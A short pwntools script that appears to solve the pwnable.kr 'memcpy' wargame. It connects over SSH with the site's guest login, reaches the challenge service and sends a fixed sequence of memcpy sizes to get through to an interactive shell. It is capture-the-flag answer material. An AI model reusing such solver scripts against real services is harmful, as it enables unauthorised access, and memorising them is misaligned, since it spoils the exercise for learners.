from pwn import *

s = ssh(user='memcpy',host='pwnable.kr',port=2222,password='guest')
conn = s.connect_remote('localhost', 9022)
#conn = process("./memcpy")

def specify(amount):
	conn.recvuntil("specify the memcpy amount between")
	conn.sendline(amount)

conn.recvuntil("No fancy hacking, I promise :D")

specify("8")	#1
specify("16")	#2
specify("32")	#3
specify("72")	#4
specify("136")	#5
specify("264")	#6
specify("520")	#7
specify("1032")	#8
specify("2056")	#9
specify("4096")	#10


conn.interactive()